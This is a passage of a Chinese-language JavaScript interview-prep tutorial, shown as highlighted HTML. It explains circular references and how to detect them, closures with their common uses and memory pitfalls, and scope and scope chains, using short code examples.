class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">naiveDeepClone</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">const</span> clone = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>      clone[key] = <span class="hljs-title function_">naiveDeepClone</span>(obj[key]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      clone[key] = obj[key];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-title function_">naiveDeepClone</span>(obj); <span class="hljs-comment">// 栈溢出: Maximum call stack size exceeded</span><br></code></pre></td></tr></table></figure><p><strong>内存泄露问题</strong></p><p>在老版本 IE 浏览器中，循环引用可能导致内存无法被垃圾回收机制正确释放</p><h2 id="如何检测循环引用"><a href="#如何检测循环引用" class="headerlink" title="如何检测循环引用"></a>如何检测循环引用</h2><p><strong>使用 Json.stringify()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasCircularReference</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-keyword">return</span> e.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;circular&#x27;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>使用 WeakMap&#x2F;WeakSet</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasCircular</span>(<span class="hljs-params">obj, seen = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakSet</span>()</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> || obj === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <br>  <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  seen.<span class="hljs-title function_">add</span>(obj);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasCircular</span>(obj[key], seen)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="面试常见问题-1"><a href="#面试常见问题-1" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：什么是循环引用？</strong></p><p>循环引用是指对象之间相互引用形成的闭环，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> a = &#123;&#125;; <br><span class="hljs-keyword">const</span> b = &#123; <span class="hljs-attr">ref</span>: a &#125;; <br>a.<span class="hljs-property">ref</span> = b; <span class="hljs-comment">// a 引用 b，b 又引用 a</span><br></code></pre></td></tr></table></figure><p><strong>Q：循环引用会带来哪些问题？</strong></p><ol><li>Json.stringify 会抛出异常</li><li>简单的深拷贝会导致无限递归</li><li>某些情况下可能会导致内存泄露</li></ol><p><strong>Q：为什么使用 WeakMap 而不是 Map 来处理循环引用？</strong></p><p>WeakMap 的键是弱引用，不会阻止垃圾回收，更适合这种临时性的引用跟踪场景</p><h1 id="JavaScript-中的闭包"><a href="#JavaScript-中的闭包" class="headerlink" title="JavaScript 中的闭包"></a>JavaScript 中的闭包</h1><h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><p>闭包（closure）是指能够访问自由变量的函数，这里的自由变量是指：</p><ol><li>不是在该函数内部声明的</li><li>也不是作为函数参数传入的</li><li>而是在该函数定义时的作用域中存在的变量</li></ol><p>更通俗的说：当一个函数记住并访问它所在的词法作用域，即使该函数在其词法作用域之外执行，就产生了闭包</p><h2 id="闭包的简单示例"><a href="#闭包的简单示例" class="headerlink" title="闭包的简单示例"></a>闭包的简单示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>; <span class="hljs-comment">// 自由变量</span><br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name); <span class="hljs-comment">// 访问外部函数的变量</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> inner;<br>&#125;<br><br><span class="hljs-keyword">const</span> myFunc = <span class="hljs-title function_">outer</span>();<br><span class="hljs-title function_">myFunc</span>(); <span class="hljs-comment">// 输出 &quot;Alice&quot; —— 这就是闭包！</span><br></code></pre></td></tr></table></figure><p>在这个例子中：</p><ol><li>inner 函数访问了 outer 函数的局部变量 <code>name</code></li><li>inner 函数被返回并在 outer 函数外被调用</li><li>但 inner 仍然能访问 name 变量</li></ol><h2 id="闭包的工作原理"><a href="#闭包的工作原理" class="headerlink" title="闭包的工作原理"></a>闭包的工作原理</h2><p>闭包之所以能够工作，是因为 JavaScript 的作用域链（Scope Chain）机制：</p><ol><li>词法作用域：函数的作用域在定义时就已经确定，而不是在运行时</li><li>作用域链：当访问一个变量时，JavaScript 会沿着定义时的作用域链查找</li><li>变量保持：即使外部函数已经执行完毕，但只要内部函数还在引用外部变量，这些外部变量就不会被垃圾回收</li></ol><h2 id="闭包的常见应用场景"><a href="#闭包的常见应用场景" class="headerlink" title="闭包的常见应用场景"></a>闭包的常见应用场景</h2><p><strong>创建私有变量</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 私有变量</span><br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">increment</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      count++;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;,<br>    <span class="hljs-attr">decrement</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      count--;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;,<br>    <span class="hljs-attr">getCount</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> count;<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">createCounter</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>()); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>()); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">decrement</span>()); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-property">count</span>); <span class="hljs-comment">// undefined (无法直接访问)</span><br></code></pre></td></tr></table></figure><p><strong>函数工厂</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-params">factor</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">number</span>) &#123;<br>    <span class="hljs-keyword">return</span> number * factor;<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> double = <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-number">2</span>);<br><span class="hljs-keyword">const</span> triple = <span class="hljs-title function_">createMultiplier</span>(<span class="hljs-number">3</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">double</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 10</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">triple</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 15</span><br></code></pre></td></tr></table></figure><p><strong>模块模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> myModule = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> privateVar = <span class="hljs-string">&#x27;I am private&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">privateMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(privateVar);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">publicMethod</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">privateMethod</span>();<br>    &#125;<br>  &#125;;<br>&#125;)();<br><br>myModule.<span class="hljs-title function_">publicMethod</span>(); <span class="hljs-comment">// &quot;I am private&quot;</span><br></code></pre></td></tr></table></figure><p><strong>事件处理和回调</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupButtons</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; buttons.<span class="hljs-property">length</span>; i++) &#123;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) &#123;<br>      buttons[index].<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button &#x27;</span> + index + <span class="hljs-string">&#x27; clicked&#x27;</span>);<br>      &#125;);<br>    &#125;)(i);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="闭包与内存管理"><a href="#闭包与内存管理" class="headerlink" title="闭包与内存管理"></a>闭包与内存管理</h2><p><strong>内存泄露风险</strong></p><p>闭包会阻止外部函数作用域中的变量被垃圾回收，不当使用会导致内存泄露</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">leakMemory</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> hugeArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;I have access to hugeArray&#x27;</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> leakingFunction = <span class="hljs-title function_">leakMemory</span>(); <span class="hljs-comment">// hugeArray 不会被回收</span><br><br><span class="hljs-comment">// 为什么 return function 中没有使用 hugeArray 却还是造成了内存泄露？</span><br><span class="hljs-comment">// 因为闭包会保存其所在的整个词法环境（包括所有可访问的变量），而不仅仅是其实际使用的变量</span><br></code></pre></td></tr></table></figure><p><strong>避免内存泄露的方法</strong></p><p>（1）及时解除引用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">leakingFunction = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 解除引用，允许垃圾回收</span><br></code></pre></td></tr></table></figure><p>（2）使用块级作用域变量 let&#x2F;const 代替 var</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setupButtons</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; buttons.<span class="hljs-property">length</span>; i++) &#123;<br>    buttons[i].<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button &#x27;</span> + i + <span class="hljs-string">&#x27; clicked&#x27;</span>);<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="闭包的进阶理解"><a href="#闭包的进阶理解" class="headerlink" title="闭包的进阶理解"></a>闭包的进阶理解</h2><p><strong>闭包与循环</strong></p><p>经典的闭包面试题：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-comment">// 输出五个 5，而不是 0,1,2,3,4</span><br></code></pre></td></tr></table></figure><p>解决方法：<br>（1）使用IIFE（立即执行函数表达式）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;)(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）使用 let 块级作用域</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>闭包与 this 指向</strong></p><p>闭包中的 this 需要特别注意：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 这里的 this 指向全局或 undefined</span><br>    &#125;;<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>()(); <span class="hljs-comment">// 输出 undefined 或报错</span><br></code></pre></td></tr></table></figure><p>解决方法：<br>（1）使用箭头函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 箭头函数继承外层 this</span><br>    &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）保存 this 引用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>);<br>    &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="闭包的优缺点"><a href="#闭包的优缺点" class="headerlink" title="闭包的优缺点"></a>闭包的优缺点</h2><p><strong>优点</strong></p><ul><li>创建私有变量和方法</li><li>保持变量状态</li><li>实现数据封装</li><li>实现函数工厂和模块模式</li></ul><p><strong>缺点</strong></p><ul><li>可能导致内存泄漏</li><li>过度使用可能会导致代码难以理解和调试</li><li>可能影响性能（变量查找要沿着作用域链）</li></ul><h2 id="面试常见问题-2"><a href="#面试常见问题-2" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：如何用闭包实现一个计数器</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++count;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="作用域-作用域链-this指向"><a href="#作用域-作用域链-this指向" class="headerlink" title="作用域&#x2F;作用域链&#x2F;this指向"></a>作用域&#x2F;作用域链&#x2F;this指向</h1><h2 id="作用域（Scope）"><a href="#作用域（Scope）" class="headerlink" title="作用域（Scope）"></a>作用域（Scope）</h2><p><strong>基本概念</strong></p><p>JavaScript 中，作用域是指程序中定义变量的区域，它决定了变量的可访问性（变量在何处可用）</p><p><strong>JavaScript 的作用域类型</strong></p><p>（1）全局作用域</p><ul><li>在函数或代码块外部声明的变量</li><li>在任何地方都可以访问</li><li>在浏览器环境中，全局作用域是 window 对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&#x27;全局变量&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// 可以访问</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）函数作用域（局部作用域）</p><ul><li>在函数内部声明的变量</li><li>只能在函数内部访问</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> localVar = <span class="hljs-string">&#x27;局部变量&#x27;</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localVar); <span class="hljs-comment">// 可以访问</span><br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(localVar); <span class="hljs-comment">// 报错: localVar is not defined</span><br></code></pre></td></tr></table></figure><p>（3）块级作用域（ES6+）</p><ul><li>使用 let 和 const 声明的变量</li><li>只在{}代码块中有效</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-keyword">let</span> blockVar = <span class="hljs-string">&#x27;块级变量&#x27;</span>;<br>  <span class="hljs-keyword">const</span> constVar = <span class="hljs-string">&#x27;常量&#x27;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(blockVar); <span class="hljs-comment">// 报错</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(constVar); <span class="hljs-comment">// 报错</span><br></code></pre></td></tr></table></figure><p><strong>变量提升</strong></p><ul><li>var 声明的变量会被提升到函数&#x2F;全局作用域的顶部</li><li>let 和 const 有暂时性死区（TDZ），不会提升</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// undefined (变量提升)</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b); <span class="hljs-comment">// 报错: Cannot access &#x27;b&#x27; before initialization</span><br><span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><h2 id="作用域链（Scope-Chain）"><a href="#作用域链（Scope-Chain）" class="headerlink" title="作用域链（Scope Chain）"></a>作用域链（Scope Chain）</h2><p><strong>基本概念</strong></p><ul><li>当访问一个变量时，JavaScript 会从当前作用域开始查找</li><li>如果当前作用域内找不到时，会向上一级作用域查找，直至全局作用域</li><li>这种链式查找过程被称为作用域链</li></ul><p><strong>作用域链的形成</strong></p><ul><li>每个函数在创建时都会保存其所在的作用域链</li><li>函数在执行时会创建新的作用域链，并添加到作用域链前端</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&#x27;outer&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> innerVar = <span class="hljs-string">&#x27;inner&#x27;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar); <span class="hljs-comment">// 当前作用域</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// 外层作用域</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// 全局作用域</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><p><strong>词法作用域（静态作用域）</strong></p><ul><li>JavaScript 